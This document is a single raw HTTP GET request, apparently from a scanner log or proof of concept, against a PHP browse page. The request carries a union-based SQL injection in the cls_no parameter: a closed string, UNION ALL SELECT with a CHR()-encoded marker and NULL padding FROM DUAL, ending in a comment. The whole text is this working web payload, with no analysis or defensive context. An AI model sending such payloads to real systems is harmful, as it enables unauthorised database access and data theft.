    GET /asord/asord_lcc_browse.php?cls_no=A%'+UNION+ALL+SELECT+CHR(113)||CHR(107)||CHR(107)||CHR(112)||CHR(113)||CHR(87)||CHR(71)||CHR(77)||CHR(70)||CHR(73)||CHR(118)||CHR(75)||CHR(68)||CHR(86)||CHR(110)||CHR(85)||CHR(106)||CHR(102)||CHR(117)||CHR(66)||CHR(106)||CHR(102)||CHR(118)||CHR(104)||CHR(122)||CHR(86)||CHR(77)||CHR(68)||CHR(117)||CHR(73)||CHR(105)||CHR(84)||CHR(65)||CHR(101)||CHR(88)||CHR(113)||CHR(113)||CHR(114)||CHR(110)||CHR(66)||CHR(84)||CHR(71)||CHR(102)||CHR(116)||CHR(120)||CHR(113)||CHR(118)||CHR(112)||CHR(120)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+DUAL--+A HTTP/1.1
